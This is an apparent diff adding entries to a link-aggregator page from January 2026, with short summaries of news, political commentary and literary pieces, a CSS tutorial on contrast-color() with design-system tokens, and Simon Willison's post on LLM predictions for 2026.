+    <article data-published="2026-01-09T11:41:28Z" data-link="https://www.raspberrypi.com/news/sixfab-wins-big-at-ces-with-raspberry-pi-powered-ai-gateway/">
+      <h1>Sixfab wins big at CES with Raspberry Pi–powered AI gateway</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Sixfab, a long-standing Raspberry Pi Design Partner, wins the CES 2026 Best of Innovation Award – the event's highest honour.</p>
+<p>The post <a href="https://www.raspberrypi.com/news/sixfab-wins-big-at-ces-with-raspberry-pi-powered-ai-gateway/">Sixfab wins big at CES with Raspberry Pi–powered AI gateway</a> appeared first on <a href="https://www.raspberrypi.com">Raspberry Pi</a>.</p>
+
+      <address>
+        <a href="https://www.raspberrypi.com/news/sixfab-wins-big-at-ces-with-raspberry-pi-powered-ai-gateway/">https://www.raspberrypi.com/news/sixfab-wins-big-at-ces-with-raspberry-pi-powered-ai-gateway/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T11:35:44Z" data-link="https://paulkrugman.substack.com/p/the-mad-kings-madness-deepens">
+      <h1>The Mad King’s Madness Deepens</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Trump wants war, war and more war – even against Americans</p>
+
+      <address>
+        <a href="https://paulkrugman.substack.com/p/the-mad-kings-madness-deepens">https://paulkrugman.substack.com/p/the-mad-kings-madness-deepens</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T11:30:06Z" data-link="https://lithub.com/lit-hub-daily-january-9-2026/">
+      <h1>Lit Hub Daily: January 9, 2026</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Carlo Masala explores worst-case scenarios in the event Russia wins in Ukraine. | Lit Hub Politics Noa Micaela Fields explores communication, poetics, and Rhianna lyrics: “I am a trans poet with hearing aids, and I playfully call myself an echodeviant</p>
+
+      <address>
+        <a href="https://lithub.com/lit-hub-daily-january-9-2026/">https://lithub.com/lit-hub-daily-january-9-2026/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T09:59:36Z" data-link="https://lithub.com/five-steps-to-a-better-writing-process/">
+      <h1>Five Steps to a Better Writing Process</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>This first appeared in Lit Hub’s Craft of Writing newsletter—sign up here. 1. Give Yourself Time The time of writing is different from the time of daily life. In daily life, our time is not free: we have to work, to meet</p>
+
+      <address>
+        <a href="https://lithub.com/five-steps-to-a-better-writing-process/">https://lithub.com/five-steps-to-a-better-writing-process/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T09:59:21Z" data-link="https://lithub.com/what-happens-if-russia-wins-the-war-it-started-in-ukraine/">
+      <h1>What Happens if Russia Wins the War it Started in Ukraine?</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>If Russia Wins is a deeply researched and chillingly plausible scenario in which Russia attacks a NATO country to see whether the alliance will respond, underscoring the danger of Western military complacency post‑Ukraine. The author, Carlo Masala, a Professor of</p>
+
+      <address>
+        <a href="https://lithub.com/what-happens-if-russia-wins-the-war-it-started-in-ukraine/">https://lithub.com/what-happens-if-russia-wins-the-war-it-started-in-ukraine/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T09:59:08Z" data-link="https://lithub.com/teenagers-at-war-on-fighting-the-british-in-new-york-1776/">
+      <h1>Teenagers at War: On Fighting the British in New York, 1776</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>By September 1776, Thomas Paine had done more than any other individual to convince Americans to break their ties with England and to declare themselves independent. He well understood that dispensing with the centuries-long tradition of monarchical rule was a</p>
+
+      <address>
+        <a href="https://lithub.com/teenagers-at-war-on-fighting-the-british-in-new-york-1776/">https://lithub.com/teenagers-at-war-on-fighting-the-british-in-new-york-1776/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T09:58:41Z" data-link="https://lithub.com/what-should-you-read-next-here-are-the-best-reviewed-books-of-the-week-1-9-2025/">
+      <h1>What Should You Read Next? Here Are the Best Reviewed Books of the Week</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Ben Markovits’ The Rest of Our Lives, Stefan Merrill Block’s Homeschooled, and Xiaolu Guo’s Call Me Ishmaelle all feature among the best reviewed books of the week. Brought to you by Book Marks, Lit Hub’s home for book reviews. *</p>
+
+      <address>
+        <a href="https://lithub.com/what-should-you-read-next-here-are-the-best-reviewed-books-of-the-week-1-9-2025/">https://lithub.com/what-should-you-read-next-here-are-the-best-reviewed-books-of-the-week-1-9-2025/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T09:58:21Z" data-link="https://lithub.com/for-an-echodeviant-poet-mishearing-is-a-method/">
+      <h1>For an Echodeviant Poet, Mishearing is a Method</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>For years I sang, unknowingly and uncorrected until one karaoke night, my own made up version of Rihanna: “We found love in a whole new place.” There’s a word for wrong lyrics like these, they’re called mondegreens—a name which originates</p>
+
+      <address>
+        <a href="https://lithub.com/for-an-echodeviant-poet-mishearing-is-a-method/">https://lithub.com/for-an-echodeviant-poet-mishearing-is-a-method/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T09:55:45Z" data-link="https://lithub.com/the-old-fire/">
+      <h1>The Old Fire</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>7 November I’m sorting things into categories – items to be thrown out, those to be given away. I can’t help smiling as I realise I’m following the advice of decluttering influencers. A cold light filters in through the window.</p>
+
+      <address>
+        <a href="https://lithub.com/the-old-fire/">https://lithub.com/the-old-fire/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T09:02:26Z" data-link="https://robertreich.substack.com/p/the-constitution-prohibits-trumps">
+      <h1>The Constitution Prohibits Trump’s War on Blue States</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>This will be one of the major legal fights to come in the Trump regime.</p>
+
+      <address>
+        <a href="https://robertreich.substack.com/p/the-constitution-prohibits-trumps">https://robertreich.substack.com/p/the-constitution-prohibits-trumps</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T08:04:20Z" data-link="https://heathercoxrichardson.substack.com/p/january-8-2026">
+      <h1>January 8, 2026</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>On MS NOW today, columnist Philip Bump broke down when talking about the shooting of Renee Nicole Good yesterday in Minneapolis.</p>
+
+      <address>
+        <a href="https://heathercoxrichardson.substack.com/p/january-8-2026">https://heathercoxrichardson.substack.com/p/january-8-2026</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T07:52:55Z" data-link="https://www.npr.org/2026/01/09/nx-s1-5672269/after-delays-missing-jan-6-plaque-displayed-capitol?utm_social_post_id=646796127&utm_source=bsky.app&utm_social_handle_id=did%3Aplc%3Aln72v57ivz2g46uqf4xxqiuh&utm_term=nprnews&utm_campaign=npr&utm_medium=social">
+      <h1>@Dave Winer's linkblog</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>After delays, the missing Jan. 6 plaque will be displayed at the Capitol.</p>
+
+      <address>
+        <a href="https://www.npr.org/2026/01/09/nx-s1-5672269/after-delays-missing-jan-6-plaque-displayed-capitol?utm_social_post_id=646796127&utm_source=bsky.app&utm_social_handle_id=did%3Aplc%3Aln72v57ivz2g46uqf4xxqiuh&utm_term=nprnews&utm_campaign=npr&utm_medium=social">https://www.npr.org/2026/01/09/nx-s1-5672269/after-delays-missing-jan-6-plaque-displayed-capitol?utm_social_post_id=646796127&utm_source=bsky.app&utm_social_handle_id=did%3Aplc%3Aln72v57ivz2g46uqf4xxqiuh&utm_term=nprnews&utm_campaign=npr&utm_medium=social</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T07:44:08Z" data-link="https://www.ncronline.org/opinion/ncr-voices/catholic-vice-president-vance-takes-social-media-justify-killing-renee-good">
+      <h1>@Dave Winer's linkblog</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Catholic Vice President Vance takes to social media to justify killing of Renee Good.</p>
+
+      <address>
+        <a href="https://www.ncronline.org/opinion/ncr-voices/catholic-vice-president-vance-takes-social-media-justify-killing-renee-good">https://www.ncronline.org/opinion/ncr-voices/catholic-vice-president-vance-takes-social-media-justify-killing-renee-good</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T06:00:59Z" data-link="https://a.wholelottanothing.org/i-absolutely-love-woodworking/">
+      <h1>I absolutely LOVE woodworking</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>I've been a homeowner for about 20 years, and in that time I picked up a handful of DIY skills, but my work was always sloppy due to my limited experience. I was envious of uncles or neighbors with garages where they could build or fix virtually anything,</p>
+
+      <address>
+        <a href="https://a.wholelottanothing.org/i-absolutely-love-woodworking/">https://a.wholelottanothing.org/i-absolutely-love-woodworking/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T03:30:00Z" data-link="https://www.jeffgeerling.com/blog/2026/mailpit-local-email-debugging/">
+      <h1>Local Email Debugging with Mailpit</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>For the past decade, I've used <a href="https://github.com/mailhog/MailHog">Mailhog</a> for local email debugging. Besides working on web applications that deal with email, I've long used email as the primary notification system for comments on the blog.</p>
+<p>I built an <a href="https://github.com/geerlingguy/ansible-role-mailhog">Ansible role for Mailhog</a>, and it was one of the main features of <a href="https://www.jeffgeerling.com/blog/2015/major-improvements-drupal-vm/">Drupal VM</a>, a popular local development environment for Drupal I sunset 3 years ago.</p>
+<p>Unfortunately, barring any future updates from the maintainers, it seems like <a href="https://github.com/mailhog/MailHog/issues/466">Mailhog has not been maintained</a> for four years now. It still <em>works</em>, but something as complex as an email debugging environment needs ongoing maintenance to stay relevant.</p>
+
+      <address>
+        <a href="https://www.jeffgeerling.com/blog/2026/mailpit-local-email-debugging/">https://www.jeffgeerling.com/blog/2026/mailpit-local-email-debugging/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T03:23:54Z" data-link="https://www.notesfromthecircus.com/p/live-with-mike-brock">
+      <h1>Live with Mike Brock</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>A recording from Mike Brock's live video</p>
+
+      <address>
+        <a href="https://www.notesfromthecircus.com/p/live-with-mike-brock">https://www.notesfromthecircus.com/p/live-with-mike-brock</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T03:21:00Z" data-link="https://daverupert.com/2026/01/contrast-color-with-custom-design-tokens/">
+      <h1>Using your design system colors with contrast-color()</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>One predictable pain point with <code>contrast-color()</code> is that it only returns <code>black</code> and <code>white</code> named colors. From a design systems perspective, that’s not ideal because you want <em>your</em> colors. You want your harmonious brand and the colors you and your team spent thousands of man hours in meetings deciding on. Those colors.</p>
+<p>In fact, <a href="https://css-tricks.com/exploring-color-contrast-for-the-first-time/">an earlier version of Safari had <code>color-contrast()</code></a> (confusing I know, naming is hard) which allowed you to pass in a list of best candidates to choose from. I beleive that proposal got mired in standards discussions, color contrast algorithms, and competing proposals; and <code>contrast-color()</code> is what survived which got simplified down to a binary result.</p>
+<p>In the future though, we can use <code>contrast-color()</code> and <code>if()</code> together to help pick the value we want. Alas, at the time of writing no browser supports both <code>if()</code> and <code>contrast-color()</code>. But we can use <a href="https://lea.verou.me/blog/2024/contrast-color/">Lea Verou’s <code>--contrast-color()</code> workaround</a> to experiment with how this will work in Chromium today.</p>
+<p>See the Pen <a href="https://codepen.io/davatron5000/pen/myPogBv">contrast-color() powered design system colors</a> by Dave Rupert ( <a href="https://codepen.io/davatron5000">@davatron5000</a>)
+on <a href="https://codepen.io">CodePen</a>.</p>
+<p>The CSS to get this working looks something like this:</p>
+<pre><code>@property --captured-color {
+  syntax: &quot;&lt;color&gt;&quot;;
+  inherits: true;
+  initial-value: white;
+}
+
+/* https://lea.verou.me/blog/2024/contrast-color/ */
+@function --contrast-color(--bg-color) {
+  --l: clamp(0, (l / var(--l-threshold, 0.623) - 1) * -infinity, 1);
+  result: oklch(from var(--bg) var(--l) 0 0);
+}
+
+:root {
+  --ds-text-white: wheat;
+  --ds-text-black: darkslategray;
+}
+
+button {
+  background-color: var(--ds-button-bg);
+  --captured-color: --contrast-color(var(--ds-button-bg));
+
+  color: if(
+     style(--captured-color: oklch(1 0 0)): var(--ds-text-white);
+     else: var(--ds-text-black);
+  );
+}
+
+</code></pre>
+<p>And that’s it! Using (a form of) <code>contrast-color()</code> you can select the proper tokens from your design system. Cool.</p>
+<p>One quirky bit needed to make it work is defining a type for <code>--captured-color</code> using CSS <code>@property</code>, <a href="https://blog.kizu.dev/captured-custom-properties/">a trick I learned from Roma Komarov</a>. To be honest I don’t fully understand <em>the why</em> behind Registered Custom Properties and the <a href="https://drafts.css-houdini.org/css-properties-values-api/#calculation-of-computed-values">Computed Value Time Behavior</a> superpower, but my simple brain created a rule “If you’re going to compare a variable to a <code>&lt;color&gt;</code> in a CSS <code>if()</code> statement, make sure to register the variable as a <code>&lt;color&gt;</code>.”</p>
+<p>If/when any of the browsers start supporting both features, I expect we’ll have to update <code>oklch(1 0 0)</code> in the style query to <code>white</code> or <code>rgb(255 255 255)</code>. At least, I hope it works that way.</p>
+<p>One unexpected challenge that I encountered with this demo was that if I abstracted out the <code>if</code> statement out into its own custom function, it would break. I’m not 100% sure why but I think it’s based on how CSS functions cache results. I’ll have to dig into this more, but I’m happy the inline <code>if</code> statement works. Hopefully someone smarter can figure it out.</p>
+<p>Anyways, exiting times. And can we pause for a moment and marvel at how this is all vanilla 2026 CSS?! What a world.</p>
+
+      <address>
+        <a href="https://daverupert.com/2026/01/contrast-color-with-custom-design-tokens/">https://daverupert.com/2026/01/contrast-color-with-custom-design-tokens/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T03:13:49Z" data-link="https://andysylvester.com/2026/01/08/4059/">
+      <h1>@Andy Sylvester's River of News</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Wired: How to Protest Safely in the Age of Surveillance – Law enforcement has more tools than ever to track your movements and access your communications. Here’s how to protect your privacy if you plan to protest.</p>
+
+      <address>
+        <a href="https://andysylvester.com/2026/01/08/4059/">https://andysylvester.com/2026/01/08/4059/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T01:00:19Z" data-link="https://robertreich.substack.com/p/a-cold-blooded-murder">
+      <h1>A cold-blooded murder</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Friends,</p>
+
+      <address>
+        <a href="https://robertreich.substack.com/p/a-cold-blooded-murder">https://robertreich.substack.com/p/a-cold-blooded-murder</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T00:55:49Z" data-link="https://steady.substack.com/p/murder-in-cold-blood">
+      <h1>Murder in Cold Blood</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>The killing of Good is as bad as it gets</p>
+
+      <address>
+        <a href="https://steady.substack.com/p/murder-in-cold-blood">https://steady.substack.com/p/murder-in-cold-blood</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T00:06:42Z" data-link="https://memex.naughtons.org/friday-9-january-2026/41564/">
+      <h1>Friday 9 January, 2026</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>No smoke without … On the other hand, it might just be letting off steam. Quote of the Day ”AI is the asbestos we’re shoveling into the walls of our high-tech society.” Cory Doctorow Nice metaphor. Musical alternative to the … <a href="https://memex.naughtons.org/friday-9-january-2026/41564/">Continue reading →</a></p>
+
+      <address>
+        <a href="https://memex.naughtons.org/friday-9-january-2026/41564/">https://memex.naughtons.org/friday-9-january-2026/41564/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T00:00:00Z" data-link="https://buttondown.com/blog/2026-01-09-custom-button-format">
+      <h1>Custom buttons now work in Markdown mode</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>A simpler format for custom buttons that works everywhere.</p>
+
+      <address>
+        <a href="https://buttondown.com/blog/2026-01-09-custom-button-format">https://buttondown.com/blog/2026-01-09-custom-button-format</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-09T00:00:00Z" data-link="https://buttondown.com/blog/attachments-deliverability">
+      <h1>Ask a Nerd: Does attaching files to your newsletter hurt deliverability?</h1>
+
+(date: 2026-01-09)
+      <p>
+      <p>Email service providers hate them, they’re awkward on mobile, and download links are better in virtually every way.</p>
+
+      <address>
+        <a href="https://buttondown.com/blog/attachments-deliverability">https://buttondown.com/blog/attachments-deliverability</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T23:35:53Z" data-link="https://doc.searls.com/2026/01/08/how-the-past-models-the-future/">
+      <h1>How the Past Models the Future</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>This is a PageXray of Craigslist.org: I ran it after reading Is Craigslist the Last Real Place on the Internet? by Jennifer Swann in Wired. It shows Craigslist doing no tracking at all. This totally retro and morally correct. Craigslist also doesn’t interrupt your experience with a cookie notice, because it doesn’t play the cookie […]</p>
+
+      <address>
+        <a href="https://doc.searls.com/2026/01/08/how-the-past-models-the-future/">https://doc.searls.com/2026/01/08/how-the-past-models-the-future/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T23:32:12Z" data-link="https://mjtsai.com/blog/2026/01/08/anker-soundcore-sleep-a30-earbuds/">
+      <h1>Anker Soundcore Sleep A30 Special Earbuds</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Juli Clover: The $200 Soundcore Sleep A30 Special earbuds feature a triple noise reduction system that blends Active Noise Cancellation, passive isolation, and adaptive snore masking to cut down on sleep interruptions. Anker is partnering with Calm to make Calm Sleep Stories available through the Soundcore app. I’m a big fan of the previous A20 […]</p>
+
+      <address>
+        <a href="https://mjtsai.com/blog/2026/01/08/anker-soundcore-sleep-a30-earbuds/">https://mjtsai.com/blog/2026/01/08/anker-soundcore-sleep-a30-earbuds/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T23:32:10Z" data-link="https://mjtsai.com/blog/2026/01/08/bose-opens-soundtouch-api/">
+      <h1>Bose Opens SoundTouch API</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Stevie Bonifield (via Hacker News): In a surprisingly user-friendly move, Bose has announced it will be open-sourcing the API documentation for its SoundTouch smart speakers, which were slated to lose official support on February 18th, as reported by Ars Technica. Bose has also moved that date back to May 6th, 2026. When cloud support ends, […]</p>
+
+      <address>
+        <a href="https://mjtsai.com/blog/2026/01/08/bose-opens-soundtouch-api/">https://mjtsai.com/blog/2026/01/08/bose-opens-soundtouch-api/</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T21:46:00Z" data-link="https://www.startribune.com/ice-raids-minnesota/601546426">
+      <h1>@Dave Winer's linkblog</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Renee Nicole Good shooting: ICE agent identified.</p>
+
+      <address>
+        <a href="https://www.startribune.com/ice-raids-minnesota/601546426">https://www.startribune.com/ice-raids-minnesota/601546426</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T20:01:13Z" data-link="https://daringfireball.net/2026/01/lets_call_a_murder_a_murder">
+      <h1>★ Let’s Call a Murder a Murder</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>Caitlin Callenson’s courage in the face of insane danger is just remarkable.</p>
+
+      <address>
+        <a href="https://daringfireball.net/2026/01/lets_call_a_murder_a_murder">https://daringfireball.net/2026/01/lets_call_a_murder_a_murder</a>
+      </address>
+    </article>
+
+    <article data-published="2026-01-08T19:42:13Z" data-link="https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#atom-everything">
+      <h1>LLM predictions for 2026, shared with Oxide and Friends</h1>
+
+(date: 2026-01-08)
+      <p>
+      <p>I joined a recording of the Oxide and Friends podcast on Tuesday to talk about 1, 3 and 6 year predictions for the tech industry. This is my second appearance on their annual predictions episode, you can see <a href="https://simonwillison.net/2025/Jan/10/ai-predictions/">my predictions from January 2025 here</a>. Here's <a href="https://oxide-and-friends.transistor.fm/episodes/predictions-2026">the page for this year's episode</a>, with options to listen in all of your favorite podcast apps or <a href="https://www.youtube.com/watch?v=lVDhQMiAbR8">directly on YouTube</a>.</p>
+<p>Bryan Cantrill started the episode by declaring that he's never been so unsure about what's coming in the next year. I share that uncertainty - the significant advances in coding agents just in the last two months have left me certain that things will change significantly, but unclear as to what those changes will be.</p>
+<p>Here are the predictions I shared in the episode.</p>
+<ul>
+<li><a href="https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#1-year-it-will-become-undeniable-that-llms-write-good-code">1 year: It will become undeniable that LLMs write good code</a></li>
+<li><a href="https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#1-year-we-re-finally-going-to-solve-sandboxing">1 year: We're finally going to solve sandboxing</a></li>
+<li><a href="https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#1-year-a-challenger-disaster-for-coding-agent-security">1 year: A &quot;Challenger disaster&quot; for coding agent security</a></li>
+<li><a href="https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#1-year-k-k-p-parrots-will-have-an-outstanding-breeding-season">1 year: Kākāpō parrots will have an outstanding breeding season</a></li>
+<li><a href="https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#3-years-the-coding-agents-jevons-paradox-for-software-engineering-will-resolve-one-way-or-the-other">3 years: the coding agents Jevons paradox for software engineering will resolve, one way or the other</a></li>
+<li><a href="https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#3-years-someone-will-build-a-new-browser-using-mainly-ai-assisted-coding-and-it-won-t-even-be-a-surprise">3 years: Someone will build a new browser using mainly AI-assisted coding and it won't even be a surprise</a></li>
+<li><a href="https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#6-years-typing-code-by-hand-will-go-the-way-of-punch-cards">6 years: Typing code by hand will go the way of punch cards</a></li>
+</ul>
+<h4>1 year: It will become undeniable that LLMs write good code <a href="https://www.youtube.com/watch?v=lVDhQMiAbR8&amp;t=1167s">▶ 19:27</a></h4>
+<blockquote>
+<p>I think that there are still people out there who are convinced that LLMs cannot write good code. Those people are in for a very nasty shock in 2026. I do not think it will be possible to get to the end of even the next three months while still holding on to that idea that the code they write is all junk and it's it's likely any decent human programmer will write better code than they will.</p>
+</blockquote>
+<p>In 2023, saying that LLMs write garbage code was entirely correct. For most of 2024 that stayed true. In 2025 that changed, but you could be forgiven for continuing to hold out. In 2026 the quality of LLM-generated code will become impossible to deny.</p>
+<p>I base this on my own experience - I've spent more time exploring <a href="https://simonwillison.net/tags/ai-assisted-programming/">AI-assisted programming</a> than most.</p>
+<p>The key change in 2025 (see <a href="https://simonwillison.net/2025/Dec/31/the-year-in-llms/#the-year-of-reasoning-">my overview for the year</a>) was the introduction of &quot;reasoning models&quot; trained specifically against code using Reinforcement Learning. The major labs spent a full year competing with each other on who could get the best code capabilities from their models, and that problem turns out to be perfectly attuned to RL since code challenges come with built-in verifiable success conditions.</p>
+<p>Since Claude Opus 4.5 and GPT-5.2 came out in November and December respectively the amount of code I've written by hand has dropped to a single digit percentage of my overall output. The same is true for many other expert programmers I know.</p>
+<p>At this point if you continue to argue that LLMs write useless code you're damaging your own credibility.</p>
+<h4>1 year: We're finally going to solve sandboxing <a href="https://www.youtube.com/watch?v=lVDhQMiAbR8&amp;t=1205s">▶ 20:05</a></h4>
+<blockquote>
+<p>I think this year is the year we're going to solve sandboxing. I want to run code other people have written on my computing devices without it destroying my computing devices if it's malicious or has bugs. [...] It's crazy that it's 2026 and I still <code>pip install</code> random code and then execute it in a way that it can steal all of my data and delete all my files. [...] I don't want to run a piece of code on any of my devices that somebody else wrote outside of sandbox ever again.</p>
+</blockquote>
+<p>This isn't just about LLMs, but it becomes even more important now there are so many more people writing code often without knowing what they're doing. Sandboxing is also a key part of the battle against prompt injection.</p>
+<p>We have a <em>lot</em> of promising technologies in play already for this - containers and WebAssembly being the two I'm most optimistic about. There's real commercial value involved in solving this problem. The pieces are there, what's needed is UX work to reduce the friction in using them productively and securely.</p>
+<h4>1 year: A &quot;Challenger disaster&quot; for coding agent security <a href="https://www.youtube.com/watch?v=lVDhQMiAbR8&amp;t=1281s">▶ 21:21</a></h4>
+<blockquote>
+<p>I think we're due a Challenger disaster with respect to coding agent security[...] I think so many people, myself included, are running these coding agents practically as root, right? We're letting them do all of this stuff. And every time I do it, my computer doesn't get wiped. I'm like, &quot;oh, it's fine&quot;.</p>
+</blockquote>
+<p>I used this as an opportunity to promote my favourite recent essay about AI security, <a href="https://embracethered.com/blog/posts/2025/the-normalization-of-deviance-in-ai/">the Normalization of Deviance in AI</a> by Johann Rehberger.</p>
+<p>The Normalization of Deviance describes the phenomenon where people and organizations get used to operating in an unsafe manner because nothing bad has happened to them yet, which can result in enormous problems (like the 1986 Challenger disaster) when their luck runs out.</p>
+<p>Every six months I predict that a headline-grabbing prompt injection attack is coming soon, and every six months it doesn't happen. This is my most recent version of that prediction!</p>
+<h4>1 year: Kākāpō parrots will have an outstanding breeding season <a href="https://www.youtube.com/watch?v=lVDhQMiAbR8&amp;t=3006s">▶ 50:06</a></h4>
+<p>(I dropped this one to lighten the mood after a discussion of the deep sense of existential dread that many programmers are feeling right now!)</p>
+<blockquote>
+<p>I think that Kākāpō parrots in New Zealand are going to have an outstanding breeding season. The reason I think this is that the Rimu trees are in fruit right now. There's only 250 of them, and they only breed if the Rimu trees have a good fruiting. The Rimu trees have been terrible since 2019, but this year the Rimu trees were all blooming. There are researchers saying that all 87 females of breeding age might lay an egg. And for a species with only 250 remaining parrots that's great news.</p>
+</blockquote>
+<p>(I just <a href="https://en.wikipedia.org/wiki/K%C4%81k%C4%81p%C5%8D#Population_timeline">checked Wikipedia</a> and I was right with the parrot numbers but wrong about the last good breeding season, apparently 2022 was a good year too.)</p>
+<p>In a year with precious little in the form of good news I am utterly delighted to share this story. Here's more:</p>
+<ul>
+<li><a href="https://blog.doc.govt.nz/2025/06/27/kakapo-breeding-season-2026/">Kākāpō breeding season 2026</a> introduction from the Department of Conservation from June 2025 .</li>
+<li><a href="https://www.auckland.ac.nz/en/news/2025/12/03/bumper-breeding-season-for-kakapo-on-the-cards.html">Bumper breeding season for kākāpō on the cards</a> - 3rd December 2025, University of Auckland.</li>
+</ul>
+<p>I don't often use AI-generated images on this blog, but the Kākāpō image the Oxide team created for this episode is just <em>perfect</em>:</p>
+<p><img src="https://static.simonwillison.net/static/2026/oxide-kakapo.jpg" alt="A beautiful green Kākāpō surrounded by candles gazes into a crystal ball"></p>
+<h4>3 years: the coding agents Jevons paradox for software engineering will resolve, one way or the other <a href="https://www.youtube.com/watch?v=lVDhQMiAbR8&amp;t=3277s">▶ 54:37</a></h4>
+<blockquote>
+<p>We will find out if the <a href="https://en.wikipedia.org/wiki/Jevons_paradox">Jevons paradox</a> saves our careers or not. This is a big question that anyone who's a software engineer has right now: we are driving the cost of actually producing working code down to a fraction of what it used to cost. Does that mean that our careers are completely devalued and we all have to learn to live on a tenth of our incomes, or does it mean that the demand for software, for custom software goes up by a factor of 10 and now our skills are even <em>more</em> valuable because you can hire me and I can build you 10 times the software I used to be able to? I think by three years we will know for sure which way that one went.</p>
+</blockquote>
+<p>The quote says it all. There are two ways this coding agents thing could go: it could turn out software engineering skills are devalued, or it could turn out we're more valuable and effective than ever before.</p>
+<p>I'm crossing my fingers for the latter! So far it feels to me like it's working out that way.</p>
+<h4>3 years: Someone will build a new browser using mainly AI-assisted coding and it won't even be a surprise <a href="https://www.youtube.com/watch?v=lVDhQMiAbR8&amp;t=3913s">▶ 65:13</a></h4>
+<blockquote>
+<p>I think somebody will have built a full web browser mostly using AI assistance, and it won't even be surprising. Rolling a new web browser is one of the most complicated software projects I can imagine[...] the cheat code is the conformance suites. If there are existing tests that it'll get so much easier.</p>
+</blockquote>
+<p>A common complaint today from AI coding skeptics is that LLMs are fine for toy projects but can't be used for anything large and serious.</p>
+<p>I think within 3 years that will be comprehensively proven incorrect, to the point that it won't even be controversial anymore.</p>
+<p>I picked a web browser here because so much of the work building a browser involves writing code that has to conform to an enormous and daunting selection of both formal tests and informal websites-in-the-wild.</p>
+<p>Coding agents are <em>really good</em> at tasks where you can define a concrete goal and then set them to work iterating in that direction.</p>
+<p>A web browser is the most ambitious project I can think of that leans into those capabilities.</p>
+<h4>6 years: Typing code by hand will go the way of punch cards <a href="https://www.youtube.com/watch?v=lVDhQMiAbR8&amp;t=4839s">▶ 80:39</a></h4>
+<blockquote>
+<p>I think the job of being paid money to type code into a computer will go the same way as punching punch cards [...] in six years time, I do not think anyone will be paid to just to do the thing where you type the code. I think software engineering will still be an enormous career. I just think the software engineers won't be spending multiple hours of their day in a text editor typing out syntax.</p>
+</blockquote>
+<p>The more time I spend on AI-assisted programming the less afraid I am for my job, because it turns out building software - especially at the rate it's now possible to build - still requires enormous skill, experience and depth of understanding.</p>
+<p>The skills are changing though! Being able to read a detailed specification and transform it into lines of code is the thing that's being automated away. What's left is everything else, and the more time I spend working with coding agents the larger that &quot;everything else&quot; becomes.</p>
+<p>Tags: <a href="https://simonwillison.net/tags/predictions">predictions</a>, <a href="https://simonwillison.net/tags/sandboxing">sandboxing</a>, <a href="https://simonwillison.net/tags/ai">ai</a>, <a href="https://simonwillison.net/tags/kakapo">kakapo</a>, <a href="https://simonwillison.net/tags/generative-ai">generative-ai</a>, <a href="https://simonwillison.net/tags/llms">llms</a>, <a href="https://simonwillison.net/tags/ai-assisted-programming">ai-assisted-programming</a>, <a href="https://simonwillison.net/tags/oxide">oxide</a>, <a href="https://simonwillison.net/tags/bryan-cantrill">bryan-cantrill</a>, <a href="https://simonwillison.net/tags/coding-agents">coding-agents</a></p>
+
+      <address>
+        <a href="https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#atom-everything">https://simonwillison.net/2026/Jan/8/llm-predictions-for-2026/#atom-everything</a>
+      </address>
+    </article>
+
